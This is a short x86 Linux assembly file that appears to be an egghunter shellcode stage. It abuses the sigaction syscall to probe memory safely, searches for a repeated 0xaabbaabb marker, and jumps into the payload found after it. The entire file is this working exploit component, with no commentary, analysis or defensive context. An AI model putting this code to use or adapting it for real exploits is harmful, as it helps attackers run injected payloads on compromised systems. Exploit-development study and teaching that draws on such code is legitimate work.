global _start

section .text
_start:
next_page:
        or cx, 0xffff
next_loc:
        inc ecx
        push byte +0x43
        pop eax
        int 0x80
        cmp al, 0xf2
        jz next_page
        mov eax, 0xaabbaabb
        mov edi, ecx
        scasd
        jnz next_loc
        scasd
        jnz next_loc
        jmp edi
